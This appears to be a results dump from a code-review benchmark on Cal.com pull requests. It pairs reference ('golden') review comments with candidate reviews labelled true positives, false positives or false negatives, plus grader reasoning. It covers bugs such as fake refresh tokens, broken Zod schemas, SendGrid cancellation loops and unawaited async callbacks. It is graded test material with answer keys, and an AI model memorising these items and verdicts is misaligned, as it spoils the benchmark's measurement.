The org and team fragments use hand-written raw SQL: `"teamId" = ANY(${array})` with JS arrays as parameters, and the `"isTeamBooking"` column. Tests only compare them structurally against identical template literals. A wrong column name, an array/type mismatch in `ANY(...)`, or a precedence bug (e.g. appending `AND ...` to an OR expression) would pass these tests.

The PR description also says the tests could not be run locally. A `$queryRaw` assertion for org and team scope would actually validate the new SQL.

Caching tests deleted although caching logic remains

The `Caching` describe block, which covered `getAuthorizationConditions` and `getFilterConditions` caching, was removed outright instead of being ported to the `Prisma.sql` format.

The service still caches via `cachedAuthConditions` / `cachedFilterConditions`, including the `null`-vs-`undefined` distinction for filters. A regression there (e.g. re-querying memberships on every call, or treating a cached `null` as uncached) is now untested.

false_negatives.golden_comment: Fetching userIdsFromOrg only when teamsFromOrg.length > 0 can exclude org-level members for orgs without child teams; consider deriving from teamIds (which includes orgId) or removing the guard so org-only orgs still include member user bookings.

true_positives.golden_comment: The parseRefreshTokenResponse function incorrectly sets refresh_token to the hardcoded string 'refresh_token' when it's missing from the OAuth refresh token response. This invalidates the token, breaking subsequent token refreshes and causing authentication failures.
true_positives.matched_candidate:
Placeholder "refresh_token" string overwrites real stored refresh tokens

When the parsed response has no `refresh_token`, the helper injects the literal string "refresh_token". Office365 then does `{ ...o365AuthCredentials, ...tokenResponse.data }` and persists the result, replacing the user's real refresh token with the string "refresh_token". This happens whenever Microsoft omits a refresh token (the schema marks it optional) and always in sync mode.

Zoom in sync mode likewise sets `key.refresh_token = "refresh_token"`. Before this change, a missing refresh token left the existing one intact. Now the credential becomes unrefreshable once the sync endpoint is turned off. Don't inject a fake value; let callers keep the existing refresh token.
true_positives.reasoning: Both identify the same bug: a missing refresh_token is replaced with the literal string 'refresh_token', overwriting the real stored token and breaking subsequent refreshes.

true_positives.golden_comment: The Zod schema in parseRefreshTokenResponse uses computed property keys [z.string().toString()] and [z.string().optional().toString()] in minimumTokenResponseSchema, which is invalid Zod syntax and will throw a runtime error.
true_positives.matched_candidate:
Computed schema keys evaluate to "[object Object]", so expiry fields are stripped in sync mode

`[z.string().toString()]` and `[z.string().optional().toString()]` both evaluate to the literal key "[object Object]". The second overwrites the first, so the schema is effectively `{ access_token: string, "[object Object]"?: unknown }`. `z.object` strips unknown keys by default, so `expires_in`, `expiry_date` and every other field from the sync endpoint is dropped.

Consequences in sync mode:
- Zoom computes `key.expiry_date = Math.round(Date.now() + undefined*1000)` = NaN. The stored key then fails `zoomTokenSchema` on next use.
- Office365 never updates expiry, so it refreshes on every call.
- Salesforce loses `instance_url`.

Use `.passthrough()`, or an explicit schema with the expected expiry field.

2. The booker then reschedules. `getOriginalRescheduledBooking` includes CANCELLED bookings, so handleNewBooking calls `deleteScheduledEmailReminder(id, referenceId, true)` on those same rows, and SendGrid cancels the batch immediately.

false_positives.candidate:
One failed SendGrid cancel aborts the whole cron cancellation pass, and the failure repeats every run

The cancellation loop has a single try/catch around all reminders. Each reminder awaits `client.request(...)`, and its DB delete is only queued as a lazy PrismaPromise in `workflowRemindersToDelete`. That array is executed by `Promise.all` only after the loop finishes.

If any SendGrid call throws (transient error, invalid or already-cancelled batch_id), three things go wrong:
1. Every remaining reminder in this run is skipped.
2. None of the queued deletes run, including those whose SendGrid cancel already succeeded.
3. On the next run (15 min later) those already-cancelled batch_ids are POSTed again. SendGrid rejects a second POST for a batch that already has a status, so the loop throws again at the same point.

The result is a persistent failure loop. Every other cancelled reminder in the 1-hour window is never cancelled and its email is sent, which is the bug this PR is meant to fix.

Fix: handle errors per reminder, delete or mark each row right after its cancel succeeds, and treat an "already cancelled" response as success.

Reschedules and workflow/step deletions still cancel immediately, so the 100 pending-cancellation cap can still be exhausted

The PR says cancellations fail once SendGrid has 100 pending `scheduled_sends` cancellations. It fixes this by deferring cancellation to the cron within 1 hour of send time.

However, rescheduling (this line) still passes `immediateDelete = true`. So do workflow deletion (workflows.tsx line 214) and step deletion (workflows.tsx line 521).

Each immediate cancel stays pending in `scheduled_sends` until the original send time, which can be up to 72h away. A handful of reschedules, or deleting one workflow with 100+ scheduled reminders, fills the account-wide quota. After that every cancellation fails, including the cron's deferred ones, and emails go out for cancelled and rescheduled bookings. Rescheduled bookings are explicitly in scope of this fix.

Fix: reschedule should use the deferred `cancelled` flag like cancel does. For workflow/step deletion, avoid the cascade removing rows before the cron runs, for example by detaching or flagging the reminders instead of cancelling immediately.

Deferring every cancellation to the 15-minute cron misses reminders that are about to be sent

Cancellation is always deferred by setting `cancelled: true`, even when the reminder's `scheduledDate` is already inside or near the cron's 1-hour window. The cron runs only every 15 minutes, and SendGrid does not guarantee cancellation of a scheduled send less than about 10 minutes before `send_at`.

So if a booking is cancelled or rescheduled roughly 25 minutes or less before a reminder fires, the cancel may happen too late or not at all, and the email is sent. Before this PR the cancellation was attempted immediately.

Fix: cancel immediately when `scheduledDate` is within the cron look-ahead window, and defer only reminders further out.

Crash when Google Meet is selected and there is no destination calendar

`const [mainHostDestinationCalendar] = evt.destinationCalendar ?? [];` yields `undefined` when the event has no destination calendar (`handleNewBooking` sets it to `null`; other callers pass `[]`). The next line then reads `mainHostDestinationCalendar.integration` without optional chaining.

Whenever `evt.location === MeetLocationType` and the organizer or event type has no destination calendar, this throws a TypeError. Before this change, that case fell back to Cal Video. Now `eventManager.create` fails and the booking flow errors out after the booking row already exists.

Fix: use `mainHostDestinationCalendar?.integration`.
true_positives.reasoning: Both identify the same bug: destructuring evt.destinationCalendar when it is null or empty leaves mainHostDestinationCalendar undefined, and subsequent access to its integration property throws. The candidate describes the booking/create path specifically, but the underlying null-reference issue matches.

true_positives.golden_comment: Logic error: when externalCalendarId is provided, you're searching for a calendar where externalId === externalCalendarId, but this will always fail since you're looking for a calendar that matches itself. Should likely find by credentialId or use different logic.
true_positives.matched_candidate:
Google update/delete fallback to the destination calendar can never match

In both `updateEvent` (line 254-256) and `deleteEvent` (line 315-317), the fallback branch only runs when `externalCalendarId` is falsy. It then searches `destinationCalendar.find(cal => cal.externalId === externalCalendarId)`, comparing against that same falsy value, so it never matches and always yields `undefined`.

Before this change, the fallback was the event's destination calendar externalId. Consequences for references with a null `externalCalendarId` (legacy bookings, and references created by the new no-credentialId and updateLocation paths):
- `events.update` is called with `calendarId: undefined` and fails, so reschedules and location changes are not reflected.
- `deleteEvent` silently targets `primary`, which returns 404 (resolved as success) when the event lives in a secondary calendar, leaving it undeleted.
true_positives.reasoning: Both identify the same logic bug: the destination calendar lookup compares externalId to externalCalendarId in a branch where that value cannot produce a match, causing the fallback to fail. The candidate adds consequences but points to the same underlying issue.

true_positives.golden_comment: Logic inversion in organization creation: The slug property is now conditionally set when IS_TEAM_BILLING_ENABLED is true, instead of when it's false as originally intended. This change, combined with requestedSlug still being set when IS_TEAM_BILLING_ENABLED is true, results in both properties being set when billing is enabled, and neither when disabled
true_positives.matched_candidate:
Organization slug condition was inverted

The original code was `...(!IS_TEAM_BILLING_ENABLED && { slug })`: the slug is set directly only when team billing is disabled, and with billing on it is stored as `requestedSlug` until payment. The new code is `...(IS_TEAM_BILLING_ENABLED ? { slug } : {})`, which flips this.

- Self-hosted / no-billing instances now create organizations with no slug, which breaks org subdomain routing.
- Billing-enabled instances get the slug immediately and bypass the payment-gated slug assignment.

This change is unrelated to the PR's purpose and looks like an accidental logic flip.
true_positives.reasoning: Both identify the inverted IS_TEAM_BILLING_ENABLED condition for setting slug, causing the slug to be assigned in the wrong billing state.

true_positives.golden_comment: The Calendar interface now requires createEvent(event, credentialId), but some implementations (e.g., Lark/Office365) still declare createEvent(event) only—this breaks the interface contract (also applies to other locations in the PR).
true_positives.matched_candidate:
Office365 always writes to the main host's calendar id, breaking other collective hosts

`createEvent` takes `event.destinationCalendar[0]`, the main host's calendar, and posts to `/me/calendars/${externalId}/events` using the current credential. With this PR, `EventManager` calls `createEvent` once per host's destination calendar, using each host's own credential.

For any non-main host on Office365, that means requesting the main host's calendar id (which may even be a Google address) with the member's token. The request fails and the member gets no event, which is the exact scenario this PR claims to fix.

The `credentialId` parameter added to the `Calendar` interface is ignored here. The service should select the destination matching its credential.

Lark (`larkcalendar/lib/CalendarService.ts` lines 128-129, 164-165) has the same problem.
true_positives.reasoning: Both comments identify the same contract mismatch in Office365 and Lark calendar implementations: createEvent does not honor the new credentialId-based per-host invocation and instead uses the main host destination, so non-main hosts fail to get events.

false_positives.candidate:
Video booking references no longer store credentialId

The old code was `credentialId: isCalendarType ? evt.destinationCalendar?.credentialId : result.credentialId`, so video results kept their own credentialId. The new code is `credentialId: isCalendarType ? result.credentialId : undefined`, which drops it for every video (Zoom, Teams, Daily, etc.) reference.

`handleCancelBooking` only deletes the video meeting when `bookingVideoReference.credentialId` is set. As a result, cancelling any new booking leaves orphaned meetings at the video provider. Other code that relies on the video reference's credential is affected the same way.

Fix: keep `result.credentialId` for all result types.

Google createEvent ignores destination calendars that lack a credentialId

`selectedCalendar` is now found only by `cal.credentialId === credentialId`. `DestinationCalendar.credentialId` is nullable, and `EventManager.createAllCalendarEvents` has a dedicated path for destinations without a credentialId. For those, no match is found and the event is inserted into `primary` instead of the user's chosen calendar. Previously `destinationCalendar.externalId` was used regardless.

In the same case, the follow-up `calendar.events.patch` (line 168) receives `calendarId: selectedCalendar`, which is `undefined`. That patch is an un-awaited promise, so it rejects as an unhandled rejection and the Meet link is never written into the description.

Fix: fall back to the matching-integration destination's externalId, and use the same resolved id (including the `primary` fallback) for the patch.

CalDAV hosts other than the main host get no event, yet creation reports success

`createEvent` filters the user's calendars with `c.externalId === mainHostDestinationCalendar.externalId`, where that externalId belongs to the first (main host's) destination calendar. When called with another collective host's CalDAV credential, none of that user's calendar URLs match.

`Promise.all([])` resolves, `responses.some(r => !r.ok)` is false, and the method returns a successful result with a uid. The booking reference is stored, but no event exists on the member's calendar, so the failure is silent.

Fix: select the destination calendar that matches this credential (via the credentialId parameter) instead of index 0.

Team members' destination calendars dropped when organizer has none

`evt.destinationCalendar` is set to `null` when neither the event type nor the organizer has a destination calendar (line 1067). The collective merge then does `evt.destinationCalendar?.push(...teamDestinationCalendars)`, which is a no-op on `null`.

In that case every other collective host's destination calendar is silently discarded, and no events are created in their calendars.

Fix: initialise to `[]`, or assign `evt.destinationCalendar = [...(evt.destinationCalendar ?? []), ...teamDestinationCalendars]`.

updateLocation references lose externalCalendarId and credentialId

`referencesToCreate` in `updateLocation` now uses `result.externalId` and `result.credentialId`. Calendar results come from `CalendarManager.updateEvent`, whose return object contains neither field. Before this change, they came from `evt.destinationCalendar`.

New calendar references created by `editLocation.handler` are therefore persisted with null `externalCalendarId` and `credentialId`. On a later cancel this has two effects:
- `handleCancelBooking` takes the legacy path, iterating every organizer calendar credential.
- Google `deleteEvent`, given a null externalCalendarId, targets `primary` (see the dead-fallback issue), so events on secondary calendars are not removed.

No-credentialId destination path no longer stores externalCalendarId on references

For destination calendars without a credentialId, `createEvent(c, event)` is called without the `externalId` argument. The resulting reference (line 169, `result.externalId`) is stored with `externalCalendarId` undefined, whereas previously it was `evt.destinationCalendar.externalId`.

Later updates and deletes for these bookings then hit the Google null-externalCalendarId paths, which now fail (update) or target `primary` (delete).

Fix: pass `destination.externalId` here as well.

Webhook payload shape of destinationCalendar changes from object to array/null inconsistently

`CalendarEvent` is spread directly into webhook payloads (`sendPayload(..., {...evt, ...})`). Changing `destinationCalendar` from a single object to `DestinationCalendar[]` silently breaks existing webhook subscribers, Zapier templates and payload templates that read `destinationCalendar.externalId` or `.integration`.

The value is also inconsistent across paths, as the updated e2e expectations show:
- `handleNewBooking` sends `null` when empty.
- confirm, cancel and payment handlers send `[]`.

This external contract change is not documented, and a single representation should be used.

Recurring cancellation repeats deletes per reference and never deletes other hosts' events

The recurring branch (organizer credentials × all updated bookings) now sits inside a `for (const reference of bookingCalendarReference)` loop. For a collective booking with N calendar references, the same set of delete calls is issued N times.

The inner logic still uses only `updBooking.references.find(ref => ref.type.includes("_calendar"))`, the first reference, and only the organizer's credentials. Team members' events for the remaining occurrences are never deleted, leaving orphaned events in their calendars.

updateAllCalendarEvents error is now silently swallowed

The catch block still builds a descriptive `message`, but the `console.error(message)` call was removed. Any failure, such as a missing credential causing `updateEvent(undefined, ...)` to throw, now returns `success: false` results with no log at all. That makes reschedule and location-update failures very hard to diagnose.

Fix: restore the logging, using the module logger.

loadUsers refactor drops organization select and turns client errors into 500s

Two unrelated changes were bundled into this refactor:

1. The dynamic-user query no longer selects `organization: { select: { slug: true } }`. Any downstream use of `user.organization` for dynamic group bookings, such as building org booker URLs, now sees undefined.
2. An empty or invalid `dynamicUserList` now throws a plain `Error` (line 728). The catch block maps any non-HttpError to `HttpError 500 "Unable to load users"`, so malformed client input becomes a server error.

Separately, the `!Array.isArray(hosts)` check after `|| []` is dead code.

false_negatives.golden_comment: The optional chaining on mainHostDestinationCalendar?.integration is redundant since you already check mainHostDestinationCalendar in the ternary condition.

The `credential` may be undefined when passed to `updateEvent` if `reference.credentialId` is set but the credential is not found. This can lead to a runtime error when `updateEvent` is called with an undefined credential, which should be handled to prevent crashes.

true_positives.golden_comment: The code uses forEach with async callbacks, which causes asynchronous operations (e.g., calendar/video event deletions, payment refunds) to run concurrently without being awaited. This 'fire-and-forget' behavior leads to unhandled promise rejections, race conditions, and incomplete cleanup, as surrounding try-catch blocks cannot properly handle errors from these unawaited promises. Replace forEach with for...of loops or Promise.all() with map() to ensure proper sequential execution and error handling.
true_positives.matched_candidate:
async forEach callback makes the surrounding try/catch dead and leaves rejections unhandled

The callback was changed to `forEach(async (bookingRef) => { const calendar = await getCalendar(...); ... })`. `forEach` ignores the returned promises.

Before this change, a synchronous failure in `getCalendar` (for example a `CalendarService` constructor throwing on a bad or undecryptable key) was caught by the enclosing `try { ... } catch` at lines 124-139 and logged.

Now every failure from `getCalendar`, `deleteEvent` or `deleteMeeting` becomes an unhandled promise rejection that the try/catch can never see. Under Node's default `--unhandled-rejections=throw` that can take down the process; at best the error is lost. The calendar/video deletions also run detached from `Reschedule`'s control flow.

Use `await Promise.allSettled(bookingRefsFiltered.map(async ...))` (or a `for...of` with `await`) inside the try block.
true_positives.reasoning: The candidate identifies the same core bug: an async forEach callback is not awaited, so failures become unhandled rejections and the surrounding try/catch cannot handle them. Its suggested Promise.allSettled or for...of fix aligns with the golden comment.

false_positives.candidate:
Dynamic imports run eagerly at module load, so nothing is lazily loaded

Each property is assigned `import("./x")`, and that call runs immediately when the `appStore` object literal is evaluated. Importing `@calcom/app-store` (which `getCalendar`, `videoClient`, the payment helpers and others do) therefore starts loading all 28 app modules at once, just as the old static imports did.

The PR's goal of async/lazy loading is not met. Cold start and memory cost are unchanged, and every call site now pays an extra `await`.

There is also a new failure mode. If any app module throws during evaluation (for example a missing env var at import time), its promise rejects with no handler attached until some caller awaits that key. That produces an `unhandledRejection` at startup even for apps that are never used.

Fix: store thunks, e.g. `applecalendar: () => import("./applecalendar")`, and call them at the use sites (`await appStore[key]?.()`).

async forEach callback makes the surrounding try/catch dead and leaves rejections unhandled

This file has the same change as the vital app: `bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...) ... })`. `forEach` discards the promises.

Errors from `getCalendar` were previously thrown synchronously and caught by the try/catch at lines 124-139. They now become unhandled rejections that bypass the catch entirely. This can crash the process under Node's default unhandled-rejection mode, or the errors are silently lost. The deletions are also no longer tied to the function's execution.

Replace it with `await Promise.allSettled(bookingRefsFiltered.map(async ...))` inside the try.

requestReschedule now fires calendar deletions as detached async callbacks with unhandled rejections

`bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...); return calendar?.deleteEvent(...) })` produces promises that nobody awaits or catches.

Previously a failure in `getCalendar` would throw synchronously and surface as a mutation error. Now any `getCalendar`, `deleteEvent` or `deleteMeeting` failure becomes an unhandled promise rejection, while the mutation continues sending emails and webhooks as if the deletes had succeeded.

Collect the promises with `map` and `await Promise.allSettled(...)`, logging any failures.

getCalendarCredentials creates getCalendar promises that are discarded for non-calendar variants

`getCalendar(credential)` is now async and is called for every credential before the `app.variant === "calendar"` check. For apps whose type ends in `_calendar` but whose variant is not `"calendar"`, the returned promise is thrown away. If it rejects (for example a `CalendarService` constructor failing to decrypt a key), the rejection is never handled.

The returned `calendar` field also changes from `Calendar | null` to `Promise<Calendar | null>`. Every consumer of `getCalendarCredentials` must now await it, which is a silent contract change for callers other than `getConnectedCalendars`.

Only call `getCalendar` inside the `variant === "calendar"` branch.

false_negatives.golden_comment: Consider adding try-catch around the await to handle import failures gracefully
